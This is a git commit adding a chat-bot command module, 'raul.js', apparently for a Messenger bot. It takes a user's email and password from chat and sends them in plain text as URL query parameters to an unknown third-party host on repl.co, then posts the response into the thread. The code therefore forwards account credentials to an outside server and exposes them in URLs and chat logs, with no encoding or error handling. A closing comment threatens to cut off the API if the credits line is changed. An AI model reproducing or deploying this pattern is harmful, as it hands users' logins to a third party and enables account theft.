4fd64c44aad1c382d93e81ef5e8175f8e055388c
yoya <162847989+aymi18@users.noreply.github.com>
2024-03-31 16:12:06 +0800

    Create raul.js

---
+++ marin_modules/commands/raul.js
@@ -0,0 +1,26 @@
+module.exports.config = {
+ name: "raul",
+ version: "1.0.0",
+ hasPermssion: 0,
+ credits: "Tokodori Threader",
+ description: "Retrieve user data from followget API",
+ usePrefix: false,
+ commandCategory: "...",
+ cooldowns: 5
+};
+
+module.exports.run = async ({ api, event, args }) => {
+   const axios = global.nodemodule["axios"];
+
+   if (args.length !== 2) {
+       return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
+   }
+
+   const [email, password] = args.map(arg => arg.trim());
+
+   const res = await axios.get(`https://folowget.hayih59124.repl.co/login?email=${email}&password=${password}`);
+   const userData = res.data;
+
+   return api.sendMessage(JSON.stringify(userData, null, 4), event.threadID, event.messageID);
+}
+//dont change credits or I'll off api
